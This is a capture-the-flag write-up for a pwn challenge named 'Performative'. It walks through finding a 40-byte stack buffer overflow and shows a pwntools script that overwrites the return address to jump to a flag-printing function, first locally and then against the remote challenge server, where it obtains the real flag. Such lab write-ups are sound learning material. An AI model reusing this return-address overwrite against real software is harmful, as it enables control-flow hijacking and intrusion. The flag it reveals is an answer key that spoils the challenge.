# 1. Performative
> README.md
- Steps to launch:
	To build and start.

		- First `cd` into the `src` directory. Then run:

```bash
docker-compose up --build -d
```

		Connect to the challenge with:
```
nc localhost 1337 (For me it was 5000)
```
	
		After solving locally, connect to the challenge with:
```
nc performative.nitephase.live 56743
```

## Solve:
- First I launched the challenge locally and was shown this
```zsh
sparsh@archlinux ~/ctf/performative/src $ ./perf
### Welcome to the performative male/female parade! ###

Yk what performative people like? just a plain ol' bof!

Lets just generate a buffer then ig?

Buffer:
```
- The first thing I wanted to do was to check the buffer limit, as no source code was provided, I could either check with `gdb` or just trial and error.
- After a few trial and error attempts I could see that the program threw a segment violation after a size of 40 characters.
```zsh
sparsh@archlinux ~/ctf/performative/src $ ./perf
### Welcome to the performative male/female parade! ###

Yk what performative people like? just a plain ol' bof!

Lets just generate a buffer then ig?

Buffer: 1234567890123456789012345678901234567890
Generating your buffer...

Your custom buffer:
========================
1234567890123456789012345678901234567890
[1]    332622 segmentation fault (core dumped)  ./perf
```
- After this I checked the `objdump` of the binary and was able to find three functions of use which were `main`, `printFlag` and `win` on the address `0x4012db`,  `0x4011e9` and `0x401275` respectively.
- Having done a similar challenge before, I could incur that adding the address of a function at the end of a buffer overflow can trick the program into running that function.
- So for that I created a small python script to connect to the local instance first.
```python
from pwn import * 

nc = remote('localhost', 5000)

print(nc.recvline())

sendpayload = b'1'*40 + p64(0x4011e9)

nc.sendline(sendpayload)
nc.recvuntil(b':')


for i in range(6): 
    print(nc.recvline())

nc.close()

```
- This resulted in the following-
```zsh
sparsh@archlinux ~/ctf/performative/src $ python3 solve.py
[+] Opening connection to localhost on port 5000: Done
b'### Welcome to the performative male/female parade! ###\n'
b' Generating your buffer...\n'
b'\n'
b'Your custom buffer:\n'
b'========================\n'
b'1111111111111111111111111111111111111111\xe9\x11@\n'
b'nite{fake_flag}\n'
[*] Closed connection to localhost port 5000
```
- And through that I could get the content of `flag.txt`
- Now changing the port to the actual port
```python
from pwn import * 

nc = remote('performative.nitephase.live', 56743)

print(nc.recvline())

sendpayload = b'1'*40 + p64(0x4011e9)

nc.sendline(sendpayload)
nc.recvuntil(b':')


for i in range(6): 
    print(nc.recvline())

nc.close()
```
- And through that I got the actual flag.
```zsh
sparsh@archlinux ~/ctf/performative/src $ python3 solve.py
[┬] Opening connection to performative.nitephase.live on port 56743: Trying 4[+] Opening connection to performative.nitephase.live on port 56743: Done
b'### Welcome to the performative male/female parade! ###\n'
b' Generating your buffer...\n'
b'\n'
b'Your custom buffer:\n'
b'========================\n'
b'1111111111111111111111111111111111111111\xe9\x11@\n'
b'nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}\n'
[*] Closed connection to performative.nitephase.live port 56743
```

## Flag:
```c
nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}
```

## Notes and Concepts Learnt:
- Practice of scripting